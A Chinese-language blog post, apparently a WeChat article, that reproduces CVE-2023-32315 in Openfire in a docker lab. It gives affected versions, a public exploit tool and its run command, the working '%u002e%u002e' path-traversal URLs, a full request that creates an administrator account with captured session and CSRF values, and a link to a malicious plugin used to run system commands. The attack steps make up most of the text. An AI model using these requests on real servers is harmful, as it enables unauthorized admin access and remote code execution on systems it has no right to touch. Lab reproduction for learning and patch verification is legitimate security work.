<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/oJ0Z3hEXfIRbQl61pj5BCQ)

**0x01 漏洞概述**
-------------

Openfire 的管理控制台是一个基于 Web 的应用程序，被发现可以使用路径遍历的方式绕过权限校验。成功利用后，未经身份验证的用户可以访问 Openfire 管理控制台中的后台页面。同时由于 Openfire 管理控制台的后台提供了安装插件的功能，所以攻击者可以通过安装恶意插件达成远程代码执行的效果。

**0x02 影响范围**
-------------

3.10.0 <= Openfire < 4.6.8

4.7.0 <= Openfire 4.7.x < 4.7.5

**0x03 复现环境**
-------------

docker 搭建 Openfire 4.7.4 漏洞环境

拉取镜像（高权限）

docker pull nasqueron/openfire:4.7.4

![](https://mmbiz.qpic.cn/sz_mmbiz_png/7vHnd7ZialYhEZyzATnwV35wwdXZcgrnF9c8s6GEHicdNVGnHgUKMER23icPSrWM0wZDZonicn09xPwRP9MibiaTBuDA/640?wx_fmt=png)

启动环境，输入以下命令

docker run --name openfire -d --restart=always \

--publish 9090:9090 --publish 5222:5222 --publish 7777:7777 \

--volume /srv/docker/openfire:/var/lib/openfire \

nasqueron/openfire:4.7.4

![](https://mmbiz.qpic.cn/sz_mmbiz_png/7vHnd7ZialYhEZyzATnwV35wwdXZcgrnFoprxm3xVIZNLicaJicFAmTZ5cvMV0DQDuIwQmSrELibPR3NpYZutC4pzQ/640?wx_fmt=png)  

访问环境，需要安装，选择简体中文后一直下一步即可

![](https://mmbiz.qpic.cn/sz_mmbiz_png/7vHnd7ZialYhEZyzATnwV35wwdXZcgrnF6FkzBdnEm5oicNW7yYazfPwqVXDGEjrZib7uxvxZcnudz7JZUhxqKZTw/640?wx_fmt=png)

访问 ip:9090

![](https://mmbiz.qpic.cn/sz_mmbiz_png/7vHnd7ZialYhEZyzATnwV35wwdXZcgrnFgGv3bph8c1QWQ36nov1fCOEzZ3gKC7LAk2ktcHHHX9zZPhKG2FQGLg/640?wx_fmt=png)

**0x04 漏洞复现**
-------------

直接下载利用脚本（可能登录不上，建议手工复现）

https://github.com/tangxiaofeng7/CVE-2023-32315-Openfire-Bypass

![](https://mmbiz.qpic.cn/sz_mmbiz_png/7vHnd7ZialYhEZyzATnwV35wwdXZcgrnFxhecldNPpZDo8OpzCDFcsO0s9C4Q7KzQPTvNvicA1CFUnC1nA4a9Ldg/640?wx_fmt=png)

进入 scan_all 目录下

进行 go 编译

go mod tidy

go build main.go

![](https://mmbiz.qpic.cn/sz_mmbiz_png/7vHnd7ZialYhEZyzATnwV35wwdXZcgrnFeD0aUkSUr3LyP9VcbdCz60SmstZmM5via2WXVKE266DME9BQRLv51Qg/640?wx_fmt=png)

main.exe -u http://192.168.30.128:9090/

![](https://mmbiz.qpic.cn/sz_mmbiz_png/7vHnd7ZialYhEZyzATnwV35wwdXZcgrnF8GGP2WKqQrDm5zyGcbJkicbib1S2zicq8LnER1OVlz92L8fP9MIibMtB6A/640?wx_fmt=png)  

**手动复现**
--------

拼接以下路径访问

/setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp

![](https://mmbiz.qpic.cn/sz_mmbiz_png/7vHnd7ZialYhEZyzATnwV35wwdXZcgrnFBEHqMfGMuicGxBpTHOlZ5mVia7sDawfVu1Woiby0rovLISwRblQ9xjB2A/640?wx_fmt=png)

```
出现这种情况，证明漏洞存在

```

```
获取JSESSIONID和csrftoken

```

```
直接浏览器访问/setup/setup-s/%u002e%u002e/%u002e%u002e/user-groups.jsp路径抓包

```

发现缺少部分 cookie

![](https://mmbiz.qpic.cn/sz_mmbiz_png/7vHnd7ZialYhEZyzATnwV35wwdXZcgrnF5auiaUwLo82Aiaynl2u6O186LbVNX1Wib4gofnIQF6X0PchH4BlQWcZ5A/640?wx_fmt=png)

发现发送包自带了 cookie，删除 cookie 重新发包

![](https://mmbiz.qpic.cn/sz_mmbiz_png/7vHnd7ZialYhEZyzATnwV35wwdXZcgrnFy8WK5nxiblEcKSpx4ZKgBCOEAIpLZ3icuRHX8ib0e0T9WC1H3FZ0lcZPQ/640?wx_fmt=png)

```
使用获取到JSESSIONID和csrftoken创建用户

```

```
Burp构造路径

```

```
/setup/setup-s/%u002e%u002e/%u002e%u002e/user-create.jsp?csrf=I5Mh5Zl1DK2qBGT&username=test123&name=&email=&password=test123&passwordConfirm=test123&isadmin=on&create=%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7

```

```
替换cookie值

```

```
Cookie: JSESSIONID=node01ia1m1nssiucro533jfseo9u156.node0;csrf=e9qzcDHbFOuKTwq

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/7vHnd7ZialYhEZyzATnwV35wwdXZcgrnFyx0rlKc9OsRWs2icwibKibMXD6Dg52bQDD0rIWd5ibFamW7L1KpEnhaqtA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/7vHnd7ZialYhEZyzATnwV35wwdXZcgrnFwAOab4icYq60tWiaQxsQnyCeIPBs3w8402cNNb4UxnXhRJ2TV6e0JxWQ/640?wx_fmt=png)

```
下载插件

```

```
https://download.csdn.net/download/qq_41904294/87912035

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/7vHnd7ZialYhEZyzATnwV35wwdXZcgrnFlY5a8D5L7ldxsa4wH4Ezvgic6tLLfBfeDThjNluJyGtWvKQGHicIibEJg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/7vHnd7ZialYhEZyzATnwV35wwdXZcgrnFUTTibGnh4GDHWC6ibAiao9y76S4XgxTKa8OofkgxN7lcMD1999siarsQSQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/7vHnd7ZialYhEZyzATnwV35wwdXZcgrnFs1PgR9DaGy35sicU5LTuJp6YXKvV5O2ricJtBAuZhqHaYcaic2JhO1Zibg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/7vHnd7ZialYhEZyzATnwV35wwdXZcgrnF9YPAEGXjPTF0r4bpZ2Eunn8B9e1I4icROibSVGB4iczHgYdI1mWDtMk7A/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/7vHnd7ZialYhEZyzATnwV35wwdXZcgrnFO6qHA8VU7YG8pYBsQb0zaLMAqAfyXavfB9z2djcx3Mibql05qkCsQWA/640?wx_fmt=png)

密码 "123" 点击登录

![](https://mmbiz.qpic.cn/sz_mmbiz_png/7vHnd7ZialYhEZyzATnwV35wwdXZcgrnFOHY1gGdpic3lVYicuLpUzTjGPl2bAqW0crTvSoxEan4yfR7ahQN5ibXdg/640?wx_fmt=png)

点击系统命令

![](https://mmbiz.qpic.cn/sz_mmbiz_png/7vHnd7ZialYhEZyzATnwV35wwdXZcgrnFj8sia0uNdjChEctXs5GmGmLd5Xxx8n7wfULNzoBvtNCeslZkoonXpSQ/640?wx_fmt=png)  

执行 whoami

![](https://mmbiz.qpic.cn/sz_mmbiz_png/7vHnd7ZialYhEZyzATnwV35wwdXZcgrnFzDVTLthKZp2qMNvkgoSYP7hRF3NmM2owDMs7cO07xZyHFpibORTjk7w/640?wx_fmt=png)

查看文件系统

![](https://mmbiz.qpic.cn/sz_mmbiz_png/7vHnd7ZialYhEZyzATnwV35wwdXZcgrnFlJY45myFO8bsSe9jbodpBRJwLg6hicB8oicicT2mKyZBM6zabZiaWbFbTA/640?wx_fmt=png)

```
此篇文章主要学习来源：https://blog.csdn.net/qq_41904294/article/details/131226136

```